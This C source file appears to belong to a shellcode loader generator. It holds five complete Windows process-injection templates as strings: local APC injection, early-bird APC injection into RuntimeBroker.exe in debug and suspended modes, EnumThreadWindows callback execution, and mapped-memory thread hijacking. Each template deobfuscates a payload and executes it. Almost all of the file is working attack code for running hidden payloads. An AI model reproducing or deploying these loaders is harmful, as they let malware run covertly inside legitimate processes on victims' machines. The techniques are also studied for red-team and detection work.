#include <windows.h>
#include <stdio.h>
#include "Common.h"

//Injections



char _APC[] =
"VOID AlertableFunction5() {\n"
"    HANDLE hEvent1 = CreateEvent(NULL, NULL, NULL, NULL);\n"
"    HANDLE hEvent2 = CreateEvent(NULL, NULL, NULL, NULL);\n"
"    if (hEvent1 && hEvent2) {\n"
"        SignalObjectAndWait(hEvent1, hEvent2, INFINITE, TRUE);\n"
"        CloseHandle(hEvent1);\n"
"        CloseHandle(hEvent2);\n"
"    }\n"
"}\n"
"\n"
"BOOL RunViaApcInjection(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {\n"
"    PVOID pAddress = NULL;\n"
"    DWORD dwOldProtection = NULL;\n"
"    pAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n"
"    if (pAddress == NULL) {\n"
"        printf(\"\\t[!] VirtualAlloc Failed With Error : %d \\n\", GetLastError());\n"
"        return FALSE;\n"
"    }\n"
"    memcpy(pAddress, pPayload, sPayloadSize);\n"
"    if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {\n"
"        printf(\"\\t[!] VirtualProtect Failed With Error : %d \\n\", GetLastError());\n"
"        return FALSE;\n"
"    }\n"
"    // If hThread is in an alertable state, QueueUserAPC will run the payload directly\n"
"    // If hThread is in a suspended state, the payload won't be executed unless the thread is resumed after\n"
"    if (!QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL)) {\n"
"        printf(\"\\t[!] QueueUserAPC Failed With Error : %d \\n\", GetLastError());\n"
"        return FALSE;\n"
"    }\n"
"    return TRUE;\n"
"}\n"
"\n"
"int wmain(void) {\n\n"
"    HANDLE hThread = NULL;\n"
"    DWORD dwThreadId = NULL;\n\n"
"	 if(!deobfuscate()){\n\n"
"		printf(\"[!] Deobfuscation Failed\\n\");\n"
"		return FALSE;\n"
"	}\n\n"
"    printf(\"[i] Creating Local Thread\\n\");\n"
"    printf(\"[i] Sleeping 2s\\n\");\n\n"
"    Sleep(2000);\n"
"    hThread = CreateThread(NULL, NULL, &AlertableFunction5, NULL, NULL, &dwThreadId);\n"
"    if (hThread == NULL) {\n"
"        printf(\"[!] CreateThread Failed With Error : %d \\n\", GetLastError());\n"
"        return FALSE;\n"
"    }\n\n"
"    printf(\"[+] Alertable Target Thread Created With Id : %d \\n\", dwThreadId);\n"
"    printf(\"[i] Sleeping 2s\\n\");\n\n"
"    Sleep(2000);\n"
"    printf(\"[i] APC Injection\\n\");\n"
"    if (!RunViaApcInjection(hThread, pDeobfuscatedPayload, sDeobfuscatedSize)) {\n"
"        printf(\"[!] RunViaApcInjection failed, error code: %d\\n\", GetLastError());\n"
"    }\n\n"
"    printf(\"[+] DONE\\n\");\n"
"    WaitForSingleObject(hThread, INFINITE);\n"
"}\n";



char _EB_APC_DP[] =
"BOOL CreateSuspendedProcess2(LPCSTR lpProcessName, DWORD* dwProcessId, HANDLE* hProcess, HANDLE* hThread) {\n"
"    CHAR lpPath[MAX_PATH * 2];\n"
"    CHAR WnDr[MAX_PATH];\n"
"    STARTUPINFO Si = { 0 };\n"
"    PROCESS_INFORMATION Pi = { 0 };\n"
"    RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));\n"
"    RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));\n"
"    Si.cb = sizeof(STARTUPINFO);\n"
"    if (!GetEnvironmentVariableA(\"WINDIR\", WnDr, MAX_PATH)) {\n"
"        printf(\"[!] GetEnvironmentVariableA Failed With Error : %d \\n\", GetLastError());\n"
"        return FALSE;\n"
"    }\n"
"    sprintf(lpPath, \"%s\\\\System32\\\\%s\", WnDr, lpProcessName);\n"
"    printf(\"\\n\\t[i] Running : \\\"%s\\\" ... \", lpPath);\n"
"    if (!CreateProcessA(NULL, lpPath, NULL, NULL, FALSE, DEBUG_PROCESS, NULL, NULL, &Si, &Pi)) {\n"
"        printf(\"[!] CreateProcessA Failed with Error : %d \\n\", GetLastError());\n"
"        return FALSE;\n"
"    }\n"
"    printf(\"[+] DONE \\n\");\n"
"    *dwProcessId = Pi.dwProcessId;\n"
"    *hProcess = Pi.hProcess;\n"
"    *hThread = Pi.hThread;\n"
"    if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)\n"
"        return TRUE;\n"
"    return FALSE;\n"
"}\n"
"\n"
"BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode, PVOID* ppAddress) {\n"
"    SIZE_T sNumberOfBytesWritten = NULL;\n"
"    DWORD dwOldProtection = NULL;\n"
"    *ppAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n"
"    if (*ppAddress == NULL) {\n"
"        printf(\"\\n\\t[!] VirtualAllocEx Failed With Error : %d \\n\", GetLastError());\n"
"        return FALSE;\n"
"    }\n"
"    printf(\"\\n\\t[i] Allocated Memory At : 0x%p \\n\", *ppAddress);\n"
"    printf(\"\\t[#] Writing Payload ... \\n\");\n"
"    printf(\"[i] Sleeping 2s\\n\");\n\n"
"    Sleep(2000);\n"
"    if (!WriteProcessMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {\n"
"        printf(\"\\n\\t[!] WriteProcessMemory Failed With Error : %d \\n\", GetLastError());\n"
"        return FALSE;\n"
"    }\n"
"    printf(\"\\t[i] Successfully Written %d Bytes\\n\", sNumberOfBytesWritten);\n"
"    if (!VirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {\n"
"        printf(\"\\n\\t[!] VirtualProtectEx Failed With Error : %d \\n\", GetLastError());\n"
"        return FALSE;\n"
"    }\n"
"    return TRUE;\n"
"}\n"
"\n"
"int wmain(void) {\n\n"
"    HANDLE hProcess = NULL;\n"
"    HANDLE hThread = NULL;\n"
"    DWORD dwProcessId = NULL;\n"
"    LPCSTR lpProcessName = \"RuntimeBroker.exe\";\n"
"    PVOID ppAddress = NULL;\n\n"
"	 if(!deobfuscate()){\n\n"
"		printf(\"[!] Deobfuscation Failed\\n\");\n"
"		return FALSE;\n"
"	}\n\n"
"    printf(\"[i] Creating Process in Debug mode\\n\");\n"
"    printf(\"[i] Sleeping 2s\\n\");\n\n"
"    Sleep(2000);\n"
"    if (!CreateSuspendedProcess2(lpProcessName, &dwProcessId, &hProcess, &hThread))\n"
"    {\n"
"        printf(\"[!] CreateSuspendedProcess2 failed, error code: %d\\n\", GetLastError());\n"
"        return -1;\n"
"    }\n\n"
"    printf(\"[i] Injected to remote process %ld\\n\", dwProcessId);\n"
"    printf(\"[i] Sleeping 2s\\n\");\n\n"
"    Sleep(2000);\n"
"    if (!InjectShellcodeToRemoteProcess(hProcess, pDeobfuscatedPayload, sDeobfuscatedSize, &ppAddress))\n"
"    {\n"
"        printf(\"[!] InjectShellcodeToRemoteProcess failed, error code: %d\\n\", GetLastError());\n"
"        return -1;\n"
"    }\n\n"
"    printf(\"[i] APC Injection\\n\");\n"
"    printf(\"[i] Sleeping 2s\\n\");\n\n"
"    Sleep(2000);\n"
"    if (!QueueUserAPC((PAPCFUNC)ppAddress, hThread, NULL)) {\n"
"        printf(\"\\t[!] QueueUserAPC Failed With Error : %d \\n\", GetLastError());\n"
"        return -1;\n"
"    }\n\n"
"    printf(\"[i] Stop debugging to run\\n\");\n"
"    printf(\"[i] Sleeping 2s\\n\");\n\n"
"    Sleep(2000);\n"
"    DebugActiveProcessStop(dwProcessId);\n"
"    WaitForSingleObject(hThread, INFINITE);\n"
"    return 0;\n"
"}\n";


char _EB_APC_SP[] =
"BOOL CreateSuspendedProcess2(LPCSTR lpProcessName, DWORD* dwProcessId, HANDLE* hProcess, HANDLE* hThread) {\n"
"    CHAR lpPath[MAX_PATH * 2];\n"
"    CHAR WnDr[MAX_PATH];\n"
"    STARTUPINFO Si = { 0 };\n"
"    PROCESS_INFORMATION Pi = { 0 };\n"
"    RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));\n"
"    RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));\n"
"    Si.cb = sizeof(STARTUPINFO);\n"
"    if (!GetEnvironmentVariableA(\"WINDIR\", WnDr, MAX_PATH)) {\n"
"        printf(\"[!] GetEnvironmentVariableA Failed With Error : %d \\n\", GetLastError());\n"
"        return FALSE;\n"
"    }\n"
"    sprintf(lpPath, \"%s\\\\System32\\\\%s\", WnDr, lpProcessName);\n"
"    printf(\"\\n\\t[i] Running : \\\"%s\\\" ... \", lpPath);\n"
"    if (!CreateProcessA(NULL, lpPath, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &Si, &Pi)) {\n"
"        printf(\"[!] CreateProcessA Failed with Error : %d \\n\", GetLastError());\n"
"        return FALSE;\n"
"    }\n"
"    printf(\"[+] DONE \\n\");\n"
"    *dwProcessId = Pi.dwProcessId;\n"
"    *hProcess = Pi.hProcess;\n"
"    *hThread = Pi.hThread;\n"
"    if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)\n"
"        return TRUE;\n"
"    return FALSE;\n"
"}\n"
"\n"
"BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode, PVOID* ppAddress) {\n"
"    SIZE_T	sNumberOfBytesWritten = NULL;\n"
"    DWORD	dwOldProtection = NULL;\n"
"    *ppAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n"
"    if (*ppAddress == NULL) {\n"
"        printf(\"\\n\\t[!] VirtualAllocEx Failed With Error : %d \\n\", GetLastError());\n"
"        return FALSE;\n"
"    }\n"
"    printf(\"\\n\\t[i] Allocated Memory At : 0x%p \\n\", *ppAddress);\n"
"    printf(\"[i] Sleeping 2s\\n\");\n\n"
"    Sleep(2000);\n"
"    if (!WriteProcessMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {\n"
"        printf(\"\\n\\t[!] WriteProcessMemory Failed With Error : %d \\n\", GetLastError());\n"
"        return FALSE;\n"
"    }\n"
"    printf(\"\\t[i] Successfully Written %d Bytes\\n\", sNumberOfBytesWritten);\n"
"    if (!VirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {\n"
"        printf(\"\\n\\t[!] VirtualProtectEx Failed With Error : %d \\n\", GetLastError());\n"
"        return FALSE;\n"
"    }\n"
"    return TRUE;\n"
"}\n"
"\n"
"int wmain(void) {\n\n"
"    HANDLE hProcess = NULL;\n"
"    HANDLE hThread = NULL;\n"
"    DWORD dwProcessId = NULL;\n"
"    LPCSTR lpProcessName = \"RuntimeBroker.exe\";\n"
"    PVOID ppAddress = NULL;\n\n"
"	 if(!deobfuscate()){\n\n"
"		printf(\"[!] Deobfuscation Failed\\n\");\n"
"		return FALSE;\n"
"	}\n\n"
"    printf(\"[i] Creating Process in Suspense mode\\n\");\n"
"    printf(\"[i] Sleeping 2s\\n\");\n\n"
"    Sleep(2000);\n"
"    if (!CreateSuspendedProcess2(lpProcessName, &dwProcessId, &hProcess, &hThread))\n"
"    {\n"
"        printf(\"[!] CreateSuspendedProcess2 failed, error code: %d\\n\", GetLastError());\n"
"        return -1;\n"
"    }\n\n"
"    printf(\"[i] Injected to remote process %ld\\n\", dwProcessId);\n"
"    printf(\"[i] Sleeping 2s\\n\");\n\n"
"    Sleep(2000);\n"
"    if (!InjectShellcodeToRemoteProcess(hProcess, pDeobfuscatedPayload, sDeobfuscatedSize, &ppAddress))\n"
"    {\n"
"        printf(\"[!] InjectShellcodeToRemoteProcess failed, error code: %d\\n\", GetLastError());\n"
"        return -1;\n"
"    }\n\n"
"    printf(\"[i] APC Injection\\n\");\n"
"    printf(\"[i] Sleeping 2s\\n\");\n\n"
"    Sleep(2000);\n"
"    if (!QueueUserAPC((PAPCFUNC)ppAddress, hThread, NULL)) {\n"
"        printf(\"\\t[!] QueueUserAPC Failed With Error : %d \\n\", GetLastError());\n"
"        return -1;\n"
"    }\n\n"
"    printf(\"[i] Resume Thread to run \\n\");\n"
"    printf(\"[i] Sleeping 2s\\n\");\n\n"
"    Sleep(2000);\n"
"    ResumeThread(hThread);\n"
"    WaitForSingleObject(hThread, INFINITE);\n"
"    return 0;\n"
"}\n";




char _CALLBACK[] =
"int wmain(void) {\n\n"
"    HANDLE hTimer = NULL;\n"
"    PVOID pAddress = NULL;\n"
"    DWORD dwOldProtection = NULL;\n\n"
"	 if(!deobfuscate()){\n\n"
"		printf(\"[!] Deobfuscation Failed\\n\");\n"
"		return FALSE;\n"
"	}\n\n"
"    printf(\"[#] Allocating Memory\\n\");\n"
"    printf(\"[i] Sleeping 2s\\n\");\n\n"
"    Sleep(2000);\n"
"    pAddress = VirtualAlloc(NULL, sDeobfuscatedSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n"
"    if (pAddress == NULL) {\n"
"        printf(\"\\t[!] VirtualAlloc Failed With Error : %d \\n\", GetLastError());\n"
"        return FALSE;\n"
"    }\n\n"
"    memcpy(pAddress, pDeobfuscatedPayload, sDeobfuscatedSize);\n\n"
"    if (!VirtualProtect(pAddress, sDeobfuscatedSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {\n"
"        printf(\"\\t[!] VirtualProtect Failed With Error : %d \\n\", GetLastError());\n"
"        return FALSE;\n"
"    }\n\n"
"    printf(\"[#] Running Callback Function\\n\");\n"
"    printf(\"[i] Sleeping 2s\\n\");\n\n"
"    Sleep(2000);\n"
"    if (!EnumThreadWindows(0, (WNDENUMPROC)pAddress, NULL)) {\n"
"        printf(\"[!] EnumThreadWindows Failed With Error : %d \\n\", GetLastError());\n"
"        return -1;\n"
"    }\n\n"
"    return 0;\n"
"}\n";


char _LOCAL_MAPPING[] =
"BOOL LocalMapInject(IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PVOID* ppAddress) {\n"
"    BOOL   bSTATE = TRUE;\n"
"    HANDLE hFile = NULL;\n"
"    PVOID  pMapAddress = NULL;\n"
"    hFile = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sPayloadSize, NULL);\n"
"    if (hFile == NULL) {\n"
"        printf(\"[!] CreateFileMapping Failed With Error : %d \\n\", GetLastError());\n"
"        bSTATE = FALSE; goto _EndOfFunction;\n"
"    }\n"
"    pMapAddress = MapViewOfFile(hFile, FILE_MAP_WRITE | FILE_MAP_EXECUTE, NULL, NULL, sPayloadSize);\n"
"    if (pMapAddress == NULL) {\n"
"        printf(\"[!] MapViewOfFile Failed With Error : %d \\n\", GetLastError());\n"
"        bSTATE = FALSE; goto _EndOfFunction;\n"
"    }\n"
"    memcpy(pMapAddress, pPayload, sPayloadSize);\n"
"_EndOfFunction:\n"
"    *ppAddress = pMapAddress;\n"
"    if (hFile)\n"
"        CloseHandle(hFile);\n"
"    return bSTATE;\n"
"}\n"
"BOOL RunViaClassicThreadHijacking(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {\n"
"    PVOID    pAddress = NULL;\n"
"    DWORD    dwOldProtection = NULL;\n"
"    CONTEXT  ThreadCtx = {\n"
"        .ContextFlags = CONTEXT_CONTROL\n"
"    };\n"
"    pAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n"
"    if (pAddress == NULL) {\n"
"        printf(\"[!] VirtualAlloc Failed With Error : %d \\n\", GetLastError());\n"
"        return FALSE;\n"
"    }\n"
"    memcpy(pAddress, pPayload, sPayloadSize);\n"
"    if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {\n"
"        printf(\"[!] VirtualProtect Failed With Error : %d \\n\", GetLastError());\n"
"        return FALSE;\n"
"    }\n"
"    if (!GetThreadContext(hThread, &ThreadCtx)) {\n"
"        printf(\"[!] GetThreadContext Failed With Error : %d \\n\", GetLastError());\n"
"        return FALSE;\n"
"    }\n"
"    ThreadCtx.Rip = (DWORD64)pAddress;\n"
"    if (!SetThreadContext(hThread, &ThreadCtx)) {\n"
"        printf(\"[!] SetThreadContext Failed With Error : %d \\n\", GetLastError());\n"
"        return FALSE;\n"
"    }\n"
"    return TRUE;\n"
"}\n\n"
"void Common() {\n"
"    printf(\"Dummy\\n\");\n"
"}\n\n"
"int wmain(void) {\n\n"
"    PVOID ppAddress = NULL;\n"
"    HANDLE hThread = NULL;\n\n"
"	 if(!deobfuscate()){\n\n"
"		printf(\"[!] Deobfuscation Failed\\n\");\n"
"		return FALSE;\n"
"	}\n\n"
"    printf(\"[i] Local Mapped Memory creation \\n\");\n"
"    printf(\"[i] Sleeping 2s\\n\");\n\n"
"    Sleep(2000);\n"
"    if (!LocalMapInject(pDeobfuscatedPayload, sDeobfuscatedSize, &ppAddress)) {\n"
"        printf(\"[!] LocalMapInject Failed With Error : %d \\n\", GetLastError());\n"
"        return -1;\n"
"    }\n\n"
"    printf(\"[!] Copied Payload to Mapped Address: %p\\n\", ppAddress);\n"
"    printf(\"[i] Sleeping 2s\\n\");\n\n"
"    Sleep(2000);\n"
"    printf(\"[i] Sleeping 2s\\n\");\n\n"
"    Sleep(2000);\n"
"    hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)&Common, NULL, CREATE_SUSPENDED, NULL);\n"
"    if (hThread == NULL) {\n"
"        printf(\"[!] CreateThread Failed With Error : %d \\n\", GetLastError());\n"
"        return FALSE;\n"
"    }\n\n"
"    printf(\"[i] Hijacking Thread\\n\");\n"
"    printf(\"[i] Sleeping 2s\\n\");\n\n"
"    Sleep(2000);\n"
"    if (!RunViaClassicThreadHijacking(hThread, ppAddress, sDeobfuscatedSize)) {\n"
"        printf(\"[!] RunViaClassicThreadHijacking Failed With Error : %d \\n\", GetLastError());\n"
"        return -1;\n"
"    }\n\n"
"    printf(\"[i] Resuming Thread\\n\");\n"
"    printf(\"[i] Sleeping 2s\\n\");\n\n"
"    Sleep(2000);\n"
"    ResumeThread(hThread);\n\n"
"    WaitForSingleObject(hThread, INFINITE);\n"
"    UnmapViewOfFile(ppAddress);\n"
"    return 0;\n\n"
"}\n";





VOID PrintInjectionFunctionality(IN INT TYPE) {
	if (TYPE == 0) {
		printf("[!] Missing Input Type (StringFunctions:362)\n");
		return;
	}

	switch (TYPE) {

	case APC:
		printf("%s\n", _APC);
		break;
	
	case EB_APC_DP:
		printf("%s\n", _EB_APC_DP);
		break;
	
	case EB_APC_SP:
		printf("%s\n", _EB_APC_SP);
		break;
	
	case CALLBACK_ENUM:
		printf("%s\n", _CALLBACK);
		break;
	
	case LOCAL_MAPPING:
		printf("%s\n", _LOCAL_MAPPING);
		break;


	default:
		printf("[!] Unsupported Type Entered : 0x%0.8X \n", TYPE);
		break;
	}

}